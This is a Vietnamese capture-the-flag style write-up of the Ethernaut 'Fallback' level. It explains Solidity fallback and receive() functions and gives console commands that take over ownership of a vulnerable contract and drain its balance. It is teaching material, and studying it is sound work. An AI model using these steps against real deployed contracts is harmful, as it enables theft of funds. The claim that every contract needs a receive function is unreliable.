# Level 1: Fallback 
## ★☆☆☆☆
Có vẻ challenge này sẽ có gì đó liên quan đến fallback function =))  
## Given contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```
## Fallback function là gì ?
Đây là một hàm đặc biệt trong smart contract, nó là một external function không tên và được sử dụng khi contract nhận ether, nó không có tham số và được gọi khi có ai đó gọi hàm không có trong contract. 
> Note: Từ solidity version 0.6.0 về sau, fallback function được tách ra làm 2 là ``fallback`` và ``receive()``  

**Receive function**: Một contract cần có ít nhất 1 hàm receive và nó sử dụng cú pháp ```receive() external payable { ... }```. Tương tự như fallback, receive không có tham số cũng không trả về gì cả. Nó được thiết kế để handle incoming ether mà không có data truyền vào. 
>Nếu không có hàm receive thì nó sẽ rơi vào fallback được khai báo là payable. Nếu không có cả hàm receive lẫn hàm fallback với payable, contract sẽ không thể nhận eth và bắn ra exception.  

>Từ các version về sau, ``receive()`` thường được ưu tiên vì tính rõ ràng hơn so với ``fallback()``
### Example
```solidity
contract special
{
    string public fall;
 
    // This fallback function
    // will keep all the Ether
    fallback() external payable{
        fall="Fallback function is executed!";
    }

}
```
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.6.0 <0.9.0;

// This contract keeps all Ether sent to it with no way
// to get it back.
contract Sink {
    event Received(address, uint);
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}
```

## Solution
Nhiệm vụ của chúng ta là chiếm quyền owner và withraw hết balance của contract.  
Để ý kỹ thì trong code ta sẽ nhận ra ngay hàm ``receive()`` như một fallback function
```solidity
 receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
Để đáp ứng require, ta cần trở thành contributior trước  
```javascript
await contract.contribute({value:toWei(0.0001)})
```
Trigger receive function bằng cách send cho nó ether
```javascript
await contract.send(1)
```
Check owner và withdraw thôi
```javascript
await contract.owner()

```
```javascript
await contract.withdraw()

```
## Reference
https://docs.soliditylang.org/en/v0.8.17/contracts.html#special-functions


